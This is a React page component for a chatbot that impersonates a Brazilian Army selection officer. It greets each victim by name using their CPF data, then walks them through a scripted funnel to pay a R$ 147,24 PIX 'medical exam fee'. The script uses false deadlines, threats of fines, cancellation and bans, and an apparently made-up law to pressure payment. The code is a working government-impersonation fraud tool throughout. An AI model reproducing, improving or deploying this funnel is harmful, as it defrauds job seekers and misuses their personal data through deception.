import { useState, useEffect, useRef } from "react";
import { useLocation, useRoute } from "wouter";
import { useQuery } from "@tanstack/react-query";
import { ExercitoHeader } from "@/components/ExercitoHeader";
import { ExercitoFooter } from "@/components/ExercitoFooter";
import { AudioMessage } from "@/components/AudioMessage";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Loader2, MessageCircle, Send, Award, Copy, Check, QrCode } from "lucide-react";
import { getExamDateFormatted } from '@/utils/examDate';

interface ChatMessage {
  id: string;
  type: "user" | "bot";
  message: string;
  timestamp: Date;
  buttons?: string[];
  audioUrl?: string;
  isLoadingAudio?: boolean;
  hasAudio?: boolean;
}

interface CandidateData {
  id: number;
  name: string;
  email: string;
  cpf: string;
  phone: string;
  birthDate: string;
  gender: string;
  city: string;
  state: string;
  transaction: {
    transactionId: string;
    amount: string;
    status: string;
  };
}

export default function BotPage() {
  const [match, params] = useRoute("/bot/:transaction_id");
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [isTyping, setIsTyping] = useState(false);
  const [inputValue, setInputValue] = useState("");
  const [candidateData, setCandidateData] = useState<CandidateData | null>(
    null,
  );
  const getNextSunday = () => getExamDateFormatted();


  const [userData, setUserData] = useState<any>(null);
  const [currentStep, setCurrentStep] = useState(1);
  const [showButtons, setShowButtons] = useState(false);
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [pixData, setPixData] = useState<any>(null);
  const [isCopied, setIsCopied] = useState(false);
  const [showOfficerIntro, setShowOfficerIntro] = useState(false);
  const [officerImageUrl, setOfficerImageUrl] = useState("");
  const [officerIntroText, setOfficerIntroText] = useState("");
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);
  const [, setLocation] = useLocation();

  
  
  const transactionId = params?.transaction_id;

  const checkPaymentStatus = async () => {
    if (!transactionId) return;

    try {
      const response = await fetch(`/api/verificar-status-pagamento/${transactionId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      const result = await response.json();

      if (result.success && result.data) {
        const status = result.data.status?.toUpperCase();

        // Redirect if payment is approved or paid
        if (status === 'APPROVED' || status === 'PAID') {
          setLocation(`/regularizacao-migracao?protocol_id=${transactionId}`);
        }
      }
    } catch (error) {
      console.error('Error checking payment status:', error);
    }
  };

  // Run payment status check on component mount
  useEffect(() => {
    checkPaymentStatus();
  }, [transactionId]);
  
  // Fetch candidate data using the protocol API
  const { data: protocolResponse, isLoading: isLoadingProtocol } = useQuery({
    queryKey: [`/api/protocol/${transactionId}`],
    enabled: !!transactionId,
    retry: false,
  });

  const generateAudio = async (text: string, gender: string): Promise<string | null> => {
    try {
      const response = await fetch('/api/generate-audio', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          text: text.replace(/<[^>]*>/g, ''), // Remove HTML tags
          gender: gender,
          voiceType: 'conversational'
        }),
      });

      const result = await response.json();
      
      if (result.success && result.data?.audioUrl) {
        return result.data.audioUrl;
      }
      return null;
    } catch (error) {
      console.error("Erro ao gerar áudio:", error);
      return null;
    }
  };

  useEffect(() => {
    const processProtocolData = async () => {
      if (
        protocolResponse &&
        typeof protocolResponse === "object" &&
        "success" in protocolResponse
      ) {
        const response = protocolResponse as any;
        if (response.success && response.data) {
          const candidate = response.data.candidate;
          const transaction = response.data.transaction;
          const applicationData = response.data.additionalData?.applicationData;

          // Save complete user data
          setUserData(response.data);

          const city = applicationData?.additionalData?.juntaData?.municipio || response.data.additionalData.applicationData.juntasData.municipio;
           let gender = response.data?.additionalData?.applicationData?.gender || response.data?.additionalData?.applicationData?.userData?.autoFilledData?.sexo

          console.log("City:", city);
         console.log("Gender:", gender)
          // Se não tem gênero, buscar via API CPF
          if (!gender) {
            console.log("Gênero não encontrado na API protocol, buscando via CPF...");
            console.log("CPF do candidato:", candidate.cpf);
            console.log("Dados completos do candidato:", candidate);
            
            try {
              const cpfResponse = await fetch(`/api/verificar-cpf`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cpf: candidate.cpf })
              });
              const cpfData = await cpfResponse.json();
              
              if (cpfData.success && cpfData.data.DADOS && cpfData.data.DADOS.sexo) {
                gender = cpfData.data.DADOS.sexo; // M ou F
                console.log("Gênero obtido via CPF:", gender);
              } else {
                gender = "M"; // fallback
                console.log("Fallback para gênero masculino");
              }
            } catch (error) {
              console.log("Erro ao buscar gênero via CPF:", error);
              gender = "M"; // fallback
            }
          }
          
          // Normalizar gênero: F/f = feminino, M/m = masculino
          gender = gender.toLowerCase();
          setCandidateData({
            id: candidate.id,
            name: candidate.name,
            email: candidate.email,
            cpf: candidate.cpf,
            phone: candidate.phone,
            birthDate: candidate.birthDate,
            gender: gender,
            city: city,
            state: applicationData?.additionalData?.juntaData?.uf || "PA",
            transaction: {
              transactionId: transaction.transactionId,
              amount: transaction.amount,
              status: transaction.status,
            },
          });
        }
      }
    };

    processProtocolData();
  }, [protocolResponse]);

  // Removed auto-scroll - now only scrolls after all messages are sent

  // Initialize chat with officer introduction when candidate data is loaded
  useEffect(() => {
    if (candidateData && userData && chatMessages.length === 0) {
      // Setup officer intro based on gender
      const officer = getOfficerDetails();
      const imageUrl = candidateData.gender.toLowerCase() === "f" 
        ? "https://i.ibb.co/BVCBXppv/leticia-militar.jpg"
        : "https://i.ibb.co/DgkQN6PT/homem.jpg";
      
      setOfficerImageUrl(imageUrl);
      setOfficerIntroText(`${officer.name} ${officer.surname} irá conversar com você e esclarecer suas dúvidas.`);
      setShowOfficerIntro(true);

      // Show intro for 4.44 seconds then start conversation
      setTimeout(() => {
        setShowOfficerIntro(false);
        setIsTyping(true);

        setTimeout(() => {
          startConversationFunnel();
          setIsTyping(false);
        }, 2500); // Increased typing time
      }, 4440);
    }
  }, [candidateData, userData, chatMessages.length]);

  const generatePixPayment = async () => {
    if (!candidateData) return;

    try {
      const response = await fetch(`/api/verificar-status-pagamento/${candidateData.transaction.transactionId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      const result = await response.json();
      
      if (result.success) {
        const pixTransaction = {
          id: result.data.id || candidateData.transaction.transactionId,
          qrCode: result.data.qr_code || result.data.qrCode,
          pixCode: result.data.pix_code || result.data.pixCode,
          amount: result.data.amount || candidateData.transaction.amount || '147.24',
          status: result.data.status || 'pending',
          createdAt: result.data.created_at || new Date().toISOString()
        };
        
        setPixData(pixTransaction);
        setShowPaymentModal(true);
      } else {
        console.error('Error fetching payment details:', result.error);
      }
    } catch (error) {
      console.error('Error fetching payment details:', error);
    }
  };

  const handleCopyPixCode = () => {
    if (!pixData?.pixCode) return;
    
    navigator.clipboard.writeText(pixData.pixCode).then(() => {
      setIsCopied(true);
      setTimeout(() => setIsCopied(false), 3000);
    });
  };

  const getOfficerDetails = () => {
    const officerStored = localStorage.getItem("officer");
    const officer = officerStored ? JSON.parse(officerStored) : null;
    if (officer) return officer;
    if (!candidateData) return { name: "", surname: "" };
  console.log("Candidate Data:", candidateData)
    const isFemale = candidateData.gender.toLowerCase() === "f";
    const surnames = [
      "Silva",
      "Santos",
      "Oliveira",
      "Souza",
      "Pereira",
      "Costa",
      "Rodrigues",
      "Almeida",
      "Nascimento",
      "Lima",
      "Araújo",
      "Fernandes",
      "Carvalho",
      "Gomes",
      "Martins",
      "Rocha",
      "Ribeiro",
      "Barbosa",
      "Teixeira",
      "Moura",
      "Freitas",
      "Mendes",
      "Cardoso",
      "Vieira",
      "Monteiro",
      "Cavalcante",
      "Andrade",
      "Dias",
      "Machado",
      "Moreira"
    ];
    const randomSurname = surnames[Math.floor(Math.random() * surnames.length)];
    localStorage.setItem(
      "officer",
      JSON.stringify({
        name: isFemale ? "Tenente Leticia" : "1º Sargento Carlos",
        surname: randomSurname,
      }),
    );
    return {
      name: isFemale ? "Tenente Leticia" : "1º Sargento Carlos",
      surname: randomSurname,
    };
  };

  const startConversationFunnel = () => {
    if (!candidateData || !userData) return;

    const firstName = candidateData.name.split(" ")[0];
    const { name: officerName, surname } = getOfficerDetails();
    const city = candidateData.city;
    const isFemale = candidateData.gender.toLowerCase() === "f";

    const step1Messages = [
      `<strong>CENTRAL MILITAR DE ${city.toUpperCase()}</strong>`,
      `Olá tudo bem? <strong>${firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase()}.</strong>`,
      `Aqui é ${isFemale ? 'a' : 'o'} ${officerName} ${surname}, responsável pela triagem ${isFemale ? 'das inscritas' : 'dos inscritos'} na <strong>Seleção Temporária Emergencial de 2025</strong> em ${city}.`,
      `Verificamos que sua inscrição foi <strong>validada com sucesso</strong>, mas o pagamento da guia do <strong>Exame Médico de Competência Mínima</strong> ainda não foi ${isFemale ? 'concluído' : 'concluído'}.`,
      `Gostaria que eu explicasse com detalhes o que está acontecendo e o que você deve fazer para <strong>garantir sua vaga</strong>?`,
    ];

    // Gerar áudio para mensagens personalizadas (nome e cidade)
    const audioFlags = [false, true, true, false, false];
    sendMultipleMessages(step1Messages, ["Quero entender"], 3500, audioFlags);
    setCurrentStep(1);
  };

  const handleSendMessage = async (message: string = inputValue) => {
    if (!message.trim() || !candidateData || isTyping) return;

    const userMessage: ChatMessage = {
      id: Date.now().toString(),
      type: "user",
      message: message.trim(),
      timestamp: new Date(),
    };

    setChatMessages((prev) => [...prev, userMessage]);
    setInputValue("");
    setShowButtons(false);
    setIsTyping(true);

    setTimeout(() => {
      proceedToNextStep(message.trim());
      setIsTyping(false);
      inputRef.current?.focus();
    }, 3500);
  };

  const sendMultipleMessages = async (
    messages: string[],
    buttons?: string[],
    delay: number = 4000,
    shouldGenerateAudio: boolean[] = []
  ) => {
    setShowButtons(false);

    // Pre-generate all audio files before showing messages
    const audioUrls: (string | null)[] = [];
    for (let i = 0; i < messages.length; i++) {
      if (shouldGenerateAudio[i] && candidateData) {
        const gender = candidateData.gender.toLowerCase() === "f" ? "feminino" : "masculino";
        const audioUrl = await generateAudio(messages[i], gender);
        audioUrls[i] = audioUrl;
      } else {
        audioUrls[i] = null;
      }
    }

    for (let i = 0; i < messages.length; i++) {
      setIsTyping(true);

      await new Promise((resolve) => {
        setTimeout(() => {
          const hasSuccessfulAudio = shouldGenerateAudio[i] && !!audioUrls[i];
          
          const message: ChatMessage = {
            id: `${Date.now()}-${i}`,
            type: "bot",
            message: messages[i],
            timestamp: new Date(),
            buttons: i === messages.length - 1 ? buttons : undefined,
            hasAudio: hasSuccessfulAudio || false,
            audioUrl: audioUrls[i] || undefined,
            isLoadingAudio: false,
          };

          setChatMessages((prev) => [...prev, message]);
          setIsTyping(false);
          resolve(undefined);
        }, delay);
      });
    }

    // Only scroll after all messages are sent
    setTimeout(() => {
      const questionContainer = document.querySelector(".question-container");
      if (questionContainer) {
        console.log("Scrolling to bottom:" + questionContainer.scrollHeight);
        questionContainer.scrollTo({
          top: questionContainer.scrollHeight,
          behavior: "smooth",
        });
      }

      // Show buttons after scrolling
      if (buttons && buttons.length > 0) {
        setTimeout(() => setShowButtons(true), 300);
      }
    }, 500);
  };


  
  
  const proceedToNextStep = (userResponse: string) => {
    if (!candidateData || !userData) return;

    const firstName = candidateData.name.split(" ")[0];
    const { name: officerName, surname } = getOfficerDetails();
    const city = candidateData.city;
    const isFemale = candidateData.gender.toLowerCase() === "f";
    const examDate = getNextSunday() ||
      userData.examSchedule?.date || getNextSunday();
    const examdata = getNextSunday() ||
      userData?.additionalData?.applicationData?.additionalData?.applicationData?.examDate?.replace(
        "de 2025",
        "",
      ) || "neste Domingo";

    switch (currentStep) {
      case 1:
        if (userResponse.toLowerCase().includes("quero entender")) {
          const step2Messages = [
            `Perfeito, ${isFemale ? 'obrigada' : 'obrigado'} pela confirmação.`,
            `Sua inscrição já passou pelas seguintes etapas:

• <strong>CPF ${isFemale ? 'validado' : 'validado'}</strong>
• <strong>Dados pessoais ${isFemale ? 'confirmados' : 'confirmados'}</strong>  
• <strong>Vaga compatível ${isFemale ? 'encontrada' : 'encontrada'}</strong>
• <strong>Protocolo de inscrição ${isFemale ? 'confirmado' : 'confirmado'}</strong>`,
            `Agora falta apenas <strong>1 passo</strong>: efetuar o pagamento do valor de <strong>R$ 147,24</strong>, ${isFemale ? 'necessária' : 'necessário'} para ativar seu agendamento médico.`,
            `Isso confirma sua presença na prova <strong>${examdata}</strong>.`,
            `${isFemale ? 'Muita gente para' : 'Muita gente para'} nesse ponto sem entender a importância dessa etapa. Posso explicar o <strong>porquê dessa taxa existir</strong>?`,
          ];
          sendMultipleMessages(step2Messages, ["Sim, me explica"]);
          setCurrentStep(2);
        }
        break;

      case 2:
        if (
          userResponse.toLowerCase().includes("sim") ||
          userResponse.toLowerCase().includes("explica")
        ) {
          const step3Messages = [
            `A taxa de <strong>R$ 147,24</strong> existe para viabilizar o agendamento e estrutura do <strong>Exame Médico de Competência Mínima (EMCM)</strong>.`,
            `Esse exame é <strong>obrigatório</strong> e ${isFemale ? 'aplicado a todas as candidatas' : 'aplicado a todos os candidatos'} ao serviço militar temporário.`,
            `Ele verifica se você apresenta as <strong>condições mínimas de saúde física e mental</strong> para exercer funções militares.`,
            `Durante o exame, são ${isFemale ? 'avaliados' : 'avaliados'}:

• <strong>Sinais vitais</strong>
• <strong>Mobilidade e resistência</strong>  
• <strong>Visão e audição</strong>
• <strong>Ausência de doenças contagiosas</strong>
• <strong>Aptidão geral para atividade física mínima</strong>`,
            `Esse é um procedimento padrão, exigido por <strong>regulamentação militar vigente</strong>.`,
            `O <strong>não comparecimento ao exame resulta em eliminação automática</strong> da seleção, e impossibilidade ${isFemale ? 'da cidadã participar' : 'do cidadão participar'} de concursos públicos e seleções pelos próximos 12 meses.`,
            `A taxa cobre:

• <strong>Emolumento de Regularização Jurídica</strong>
• <strong>Agendamento e Preferência de Atendimento nos Centros Médicos</strong>
• <strong>Custos administrativos e médicos</strong>  
• <strong>Garantia de estrutura para seu atendimento</strong>`,
            `Posso te falar ${isFemale ? 'os benefícios reais de você passar' : 'os benefícios reais de você passar'} nessa seleção?`,
          ];
          sendMultipleMessages(step3Messages, ["Sim, quero ver os benefícios"]);
          setCurrentStep(3);
        }
        break;

      case 3:
        if (
          userResponse.toLowerCase().includes("sim") ||
          userResponse.toLowerCase().includes("benefícios")
        ) {
          const step4Messages = [
            `Passando pela <strong>Seleção</strong> e sendo ${isFemale ? 'aprovada você recebe' : 'aprovado você recebe'}:`,
            `• <strong>Salário inicial de R$ 2.300 a R$ 8.847</strong>
• <strong>Certificação válida nacionalmente</strong>
• <strong>Acesso a atendimento médico e convênios</strong>`,
            `• <strong>Auxílio-moradia e alimentação durante o serviço</strong>
• <strong>Pontuação extra em concursos e seleções públicas</strong>
• <strong>Reconhecimento no currículo profissional</strong>`,
            `• <strong>Participação em ações civis e logísticas em sua região</strong>`,
            `E o melhor: tudo isso com <strong>contrato temporário</strong> e <strong>sem vínculo militar definitivo</strong>.`,
            `Deseja continuar agora e <strong>garantir sua vaga</strong>?`,
          ];
          sendMultipleMessages(step4Messages, ["Sim, quero continuar"]);
          setCurrentStep(4);
        }
        break;

      case 4:
        if (
          userResponse.toLowerCase().includes("sim") ||
          userResponse.toLowerCase().includes("continuar")
        ) {
          const expirationDate = new Date();
          expirationDate.setMinutes(expirationDate.getMinutes() + 30);
          const formattedTime = `${expirationDate.getHours().toString().padStart(2, "0")}:${expirationDate.getMinutes().toString().padStart(2, "0")}`;

          const step5Messages = [
            `${'Ótimo'}, ${firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase()}!, O sistema informa que o protocolo ${isFemale ? 'gerado' : 'gerado'} para o seu CPF <strong>expira em 30 minutos</strong>.`,
            `<strong>Após esse prazo:</strong>

• <strong>Sua inscrição será ${isFemale ? 'cancelada' : 'cancelada'}</strong>
• <strong>Você perderá os R$ 78,85 ${isFemale ? 'pagos' : 'pagos'}</strong> - Conforme a Lei nº 8.9838/2025, foi ${isFemale ? 'iniciado' : 'iniciado'} um processo federal em seu nome que não foi ${isFemale ? 'finalizado' : 'finalizado'}, o que demandou o acionamento indevido da máquina pública e o uso desnecessário de recursos administrativos.`,
            `• <strong>Uma multa administrativa de R$ 350,00</strong> poderá ser ${isFemale ? 'registrada' : 'registrada'} no seu CPF
• <strong>Você será ${isFemale ? 'bloqueada' : 'bloqueado'}</strong> para participar de novas seleções neste ciclo`,
            `Deseja que eu gere novamente sua <strong>guia de pagamento</strong>?`,
          ];
          const audioFlags5 = [true, false, false, false];
          sendMultipleMessages(step5Messages, ["Sim, gerar guia de pagamento"], 2500, audioFlags5);
          setCurrentStep(5);
        }
        break;

      case 5:
        if (
          userResponse.toLowerCase().includes("sim") ||
          userResponse.toLowerCase().includes("gerar")
        ) {
          const examLocation = userData.examLocation?.name || userData.additionalData?.applicationData?.examLocation?.address || "Junta Militar";
          const expirationDate = new Date();
          expirationDate.setDate(expirationDate.getDate());
          expirationDate.setHours(expirationDate.getHours() + 1);
          const formattedDate = `${expirationDate.getDate().toString().padStart(2, "0")}/${(expirationDate.getMonth() + 1).toString().padStart(2, "0")}`;
          const time = userData.examSchedule?.time || userData.additionalData?.applicationData?.examSchedule?.time || "10:00";
          const formattedTime = `${expirationDate.getHours().toString().padStart(2, "0")}:${expirationDate.getMinutes().toString().padStart(2, "0")}`;

          const step6Messages = [
            `Perfeito ${firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase()}! Tudo certo. Sua <strong>guia de pagamento foi ${'gerada'} com sucesso</strong>.`,
            `<strong>Valor: R$ 147,24</strong>
<strong>Validade: até às ${formattedTime}</strong>`,
            `<strong>Local da prova:</strong> ${examLocation}
<strong>Horário:</strong> Domingo, (${time})`,
            `Este pagamento ativa seu agendamento no <strong>Exame Médico de Competência Mínima (EMCM)</strong>.`,
            `<strong>${isFemale ? 'Obrigatória' : 'Obrigatório'}</strong> para ${isFemale ? 'todas as candidatas' : 'todos os candidatos'} à seleção temporária.`,
            `<strong>Sem ele, seu protocolo será ${isFemale ? 'considerado incompleto' : 'considerado incompleto'}</strong> e sua inscrição será ${isFemale ? 'cancelada' : 'cancelada'} automaticamente.`,
            `Escaneie o QR Code abaixo com o app do seu banco ou copie o código para pagar.`,
            `Assim que ${isFemale ? 'confirmado' : 'confirmado'}, seu status será ${isFemale ? 'atualizado' : 'atualizado'} e sua <strong>vaga ${isFemale ? 'garantida' : 'garantida'}</strong>.`,
          ];
          const audioFlags5 = [true, false, false, false, false, false, false, false];
          sendMultipleMessages(step6Messages, ["Exibir Guia de Pagamento"], 2500, audioFlags5);
          setCurrentStep(6);
        }
        break;

      case 6:
        if (
          userResponse.toLowerCase().includes("exibir guia") ||
          userResponse.toLowerCase().includes("guia de pagamento")
        ) {
          // Generate PIX payment and show modal
          generatePixPayment();
          return;
        } else if (
          userResponse.toLowerCase().includes("copiar") ||
          userResponse.toLowerCase().includes("pix")
        ) {
          // Redirect to payment page
          window.location.href = `/pagamento?transaction_id=${candidateData.transaction.transactionId}`;
          return;
        } else if (userResponse.toLowerCase().includes("já paguei")) {
          const step7Messages = [
            `<strong>${isFemale ? 'Aguardando' : 'Aguardando'} confirmação de pagamento...</strong>`,
            `<strong>Lembrete:</strong> o sistema cancela seu protocolo automaticamente em 30 minutos.`,
          ];
          sendMultipleMessages(step7Messages, ["Exibir Guia de Pagamento"]);
          setCurrentStep(6);
        }
        break;
    }
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      handleSendMessage();
    }
  };

  if (!match) {
    return <div>Página não encontrada</div>;
  }

  if (isLoadingProtocol) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="flex items-center space-x-3">
          <Loader2 className="h-6 w-6 animate-spin text-[#6a7d00]" />
          <span className="text-lg text-gray-700">Carregando...</span>
        </div>
      </div>
    );
  }

  if (!candidateData) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="max-w-md mx-auto p-8 text-center">
          <h2 className="text-xl font-semibold text-red-600 mb-4">
            Protocolo não encontrado
          </h2>
          <p className="text-gray-600">
            Não foi possível encontrar os dados para o protocolo:{" "}
            {transactionId}
          </p>
        </div>
      </div>
    );
  }

  if (showOfficerIntro) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-green-900 via-green-800 to-green-700 flex items-center justify-center">
        <div className="text-center text-white max-w-md mx-auto px-6">
          <div className="mb-6">
            <img 
              src={officerImageUrl} 
              alt="Oficial Responsável" 
              className="w-32 h-32 rounded-full mx-auto border-4 border-white shadow-lg object-cover"
            />
          </div>
          <p className="text-xl font-medium leading-relaxed">
            {officerIntroText}
          </p>
          <div className="mt-6">
            <div className="flex items-center justify-center space-x-2">
              <div className="w-2 h-2 bg-white rounded-full animate-bounce"></div>
              <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '0.1s' }}></div>
              <div className="w-2 h-2 bg-white rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  const { name: officerName, surname } = getOfficerDetails();

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <ExercitoHeader
        customTitle={`${officerName} ${surname}`}
        customSubtitle={`Oficial de Seleção - ${candidateData.city}`}
        block_name={true}
      />

      {/* Chat Container */}
      <div className="flex-1 flex flex-col relative">
        {/* Chat Messages */}
        <div className="flex-1 overflow-y-auto p-4 space-y-4 chat-container">
          {chatMessages.map((message, index) => (
            <div
              key={message.id}
              className={`flex ${message.type === "user" ? "justify-end" : "justify-start"} animate-message-slide-in`}
              style={{ animationDelay: `${index * 0.1}s` }}
            >
              <div
                className={`flex items-end space-x-2 max-w-[80%] ${message.type === "user" ? "flex-row-reverse space-x-reverse" : ""}`}
              >
                {message.type === "bot" && (
                  <div className="w-8 h-8 rounded-full flex-shrink-0 shadow-sm overflow-hidden">
                    <img 
                      src={candidateData.gender.toLowerCase() === "f" 
                        ? "https://i.ibb.co/BVCBXppv/leticia-militar.jpg"
                        : "https://i.ibb.co/DgkQN6PT/homem.jpg"
                      } 
                      alt="Oficial" 
                      className="w-full h-full object-cover"
                    />
                  </div>
                )}
                <div
                  className={`px-4 py-3 rounded-2xl shadow-sm ${
                    message.type === "user"
                      ? "bg-[#6a7d00] text-white rounded-br-sm"
                      : "bg-gray-100 text-gray-800 rounded-bl-sm"
                  }`}
                >
                  {/* Show text only if no audio or audio failed */}
                  {(!message.hasAudio || !message.audioUrl) && (
                    <div
                      className="whitespace-pre-wrap text-sm leading-relaxed"
                      dangerouslySetInnerHTML={{ __html: message.message }}
                    />
                  )}
                  
                  {/* Audio component for bot messages */}
                  {message.type === "bot" && message.hasAudio && (
                    <div className={(!message.audioUrl) ? "mt-3" : ""}>
                      {message.isLoadingAudio ? (
                        <AudioMessage 
                          audioUrl="" 
                          isLoading={true}
                        />
                      ) : message.audioUrl ? (
                        <AudioMessage 
                          audioUrl={message.audioUrl}
                          duration={0}
                        />
                      ) : null}
                    </div>
                  )}
                </div>
              </div>
            </div>
          ))}

          {isTyping && (
            <div className="flex justify-start animate-message-slide-in">
              <div className="flex items-end space-x-2">
                <div className="w-8 h-8 rounded-full bg-[#6a7d00] flex items-center justify-center shadow-sm">
                  <Award className="h-4 w-4 text-white" />
                </div>
                <div className="bg-gray-100 rounded-2xl rounded-bl-sm px-4 py-3 shadow-sm">
                  <div className="flex space-x-1">
                    <div className="w-2 h-2 bg-[#6a7d00] rounded-full animate-bounce"></div>
                    <div
                      className="w-2 h-2 bg-[#6a7d00] rounded-full animate-bounce"
                      style={{ animationDelay: "0.2s" }}
                    ></div>
                    <div
                      className="w-2 h-2 bg-[#6a7d00] rounded-full animate-bounce"
                      style={{ animationDelay: "0.4s" }}
                    ></div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {chatMessages.length === 0 && !isTyping && (
            <div className="text-center py-12">
              <div className="w-16 h-16 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <MessageCircle className="h-8 w-8 text-gray-400" />
              </div>
              <p className="text-gray-500">Aguardando mensagem...</p>
            </div>
          )}

          <div ref={messagesEndRef} />
        </div>

        {/* Dynamic Conversation Buttons */}
        {showButtons && chatMessages.length > 0 && !isTyping && (
          <div className="bottom-0 question-container left-0 right-0 px-4 py-3 bg-white/95 backdrop-blur-sm z-10">
            <div className="flex flex-wrap gap-2 justify-center">
              {chatMessages[chatMessages.length - 1]?.buttons?.map(
                (button, index) => (
                  <Button
                    key={button}
                    variant="outline"
                    size="sm"
                    className="rounded-full text-xs border-[#6a7d00] text-[#6a7d00] hover:bg-[#6a7d00] hover:text-white transition-all duration-200 hover:scale-105 animate-fade-in font-medium shadow-sm"
                    style={{ animationDelay: `${index * 0.1}s` }}
                    onClick={() => handleSendMessage(button)}
                  >
                    {button}
                  </Button>
                ),
              )}
            </div>
          </div>
        )}
      </div>

      <div className="bg-white">
        <ExercitoFooter />
      </div>

      {/* Payment Modal */}
      <Dialog open={showPaymentModal} onOpenChange={setShowPaymentModal}>
        <DialogContent className="max-w-md mx-4">
          <DialogHeader>
            <DialogTitle className="text-center text-[#6a7d00] font-bold">
              Guia de Pagamento
            </DialogTitle>
          </DialogHeader>
          
          {pixData && (
            <div className="space-y-6">
              {/* Amount */}
              <div className="text-center">
                <p className="text-sm text-gray-500 mb-2">Total a pagar</p>
                <p className="text-4xl font-light text-gray-900 mb-1">
                  R$ {(() => {
                    const amount = pixData.amount || '147.24';
                    // Se o valor vier em centavos (como 14724), divide por 100
                    const numAmount = parseFloat(amount);
                    const finalAmount = numAmount > 1000 ? numAmount / 100 : numAmount;
                    return finalAmount.toFixed(2).replace('.', ',');
                  })()}
                </p>
                <p className="text-sm text-gray-500">
                  Exame Médico de Competência Mínima
                </p>
              </div>

              {/* QR Code */}
              {pixData.pixCode ? (
                <div className="flex justify-center">
                  <div className="bg-white p-4 rounded-lg border-2 border-gray-200">
                    <img 
                      src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixData.pixCode)}`}
                      alt="QR Code PIX" 
                      className="w-48 h-48"
                      onError={(e) => {
                        if (pixData.qrCode) {
                          e.currentTarget.src = pixData.qrCode;
                        }
                      }}
                    />
                  </div>
                </div>
              ) : (
                <div className="flex justify-center">
                  <div className="bg-gray-100 p-8 rounded-lg border-2 border-dashed border-gray-300">
                    <QrCode className="w-32 h-32 text-gray-400 mx-auto" />
                    <p className="text-sm text-gray-500 text-center mt-2">
                      Carregando QR Code...
                    </p>
                  </div>
                </div>
              )}

              {/* PIX Code */}
              <div>
                <h3 className="text-lg font-medium text-gray-900 mb-4">Código PIX</h3>
                <div className="space-y-4">
                  <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
                    <p className="text-xs font-mono text-gray-700 break-all leading-relaxed">
                      {pixData.pixCode || 'Gerando código...'}
                    </p>
                  </div>
                  
                  <Button
                    onClick={handleCopyPixCode}
                    disabled={!pixData.pixCode}
                    className="w-full py-3 text-base font-medium bg-[#6a7d00] hover:bg-[#5a6d00] text-white rounded-lg transition-colors"
                  >
                    {isCopied ? (
                      <div className="flex items-center justify-center">
                        <Check className="h-5 w-5 mr-2" />
                        Copiado
                      </div>
                    ) : (
                      <div className="flex items-center justify-center">
                        <Copy className="h-5 w-5 mr-2" />
                        Copiar código
                      </div>
                    )}
                  </Button>
                </div>
              </div>

              {/* Instructions */}
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                <h4 className="font-medium text-blue-900 mb-2">Como pagar:</h4>
                <ol className="text-sm text-blue-800 space-y-1">
                  <li>1. Abra o app do seu banco</li>
                  <li>2. Selecione a opção PIX</li>
                  <li>3. Escaneie o QR Code ou cole o código</li>
                  <li>4. Confirme o valor de R$ 147,24</li>
                </ol>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
